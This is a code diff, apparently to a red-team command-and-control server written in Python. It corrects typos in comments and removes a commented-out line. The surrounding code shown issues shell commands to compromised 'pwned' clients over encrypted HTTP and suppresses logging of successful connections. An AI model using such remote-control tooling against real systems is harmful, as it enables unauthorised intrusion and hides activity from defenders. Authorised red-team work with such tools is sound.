@@ -9,8 +9,8 @@ from encryption import cipher
 from settings import FILE_REQUEST, CWD_RESPONSE, FILE_SEND, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR, STORAGE
 
 def get_new_session():
-    """ Function to check if other sessions exist. If none do, re-initialize variables. However, if session do
-    exist, allow the red team operator to pick one to become a new active session. """
+    """ Function to check if other sessions exist. If none do, reinitialize variables. However, if sessions do
+    exist, allow the red team operator to pick one to become an active session. """
 
     # These variables must be global as they will often be updated via multiple sessions
     global active_session, pwned_dict, pwned_id
@@ -94,16 +94,16 @@ class C2Handler(BaseHTTPRequestHandler):
 
                     # Azure kills a waiting HTTP GET session after 4 minutes, so we must handle input with a timeout
                     try:
-                        # Collect the command to run on the client; set Linux style promt as well
+                        # Collect the command to run on the client; set Linux style prompt as well
                         command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)
 
                     # If timeout occurs on our input, do a simple command to trigger a new connection
                     except TimeoutOccurred:
                         command = KEEP_ALIVE_CMD
 
-                # Collect the command to run on the client; set Linux style promt as well
+                # Collect the command to run on the client; set Linux style prompt as well
                 else:
-                    # Collect the command to run on the client; set Linux style promt as well
+                    # Collect the command to run on the client; set Linux style prompt as well
                     command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
 
                 # Write the command back to the client as a response; must utf-8 encode and encrypt
@@ -237,9 +237,8 @@ class C2Handler(BaseHTTPRequestHandler):
 
     def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
         """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
-        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
+        to the screen. Our doesn't log any successful connections; it just returns, which is what we want. """
         return
-        # return super().log_request(code, size)()
 
 # This maps to the client that we have a promt for
 active_session = 1
